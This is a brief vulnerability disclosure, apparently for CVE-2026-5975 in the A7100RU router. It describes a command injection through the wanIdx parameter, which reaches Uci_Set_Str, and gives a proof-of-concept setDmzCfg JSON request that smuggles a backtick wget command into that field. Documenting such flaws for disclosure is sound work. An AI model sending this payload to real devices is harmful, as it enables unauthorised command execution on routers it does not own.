# A7100RU Vulnerability（CVE-2026-5975）
...
In sub_42D6EC function, it reads in a user-provided parameter `wanIdx` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `wanIdx` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setDmzCfg","enable":"2","wanIdx":"`wget 192.168.6.1:7777/testpoc`"}
```
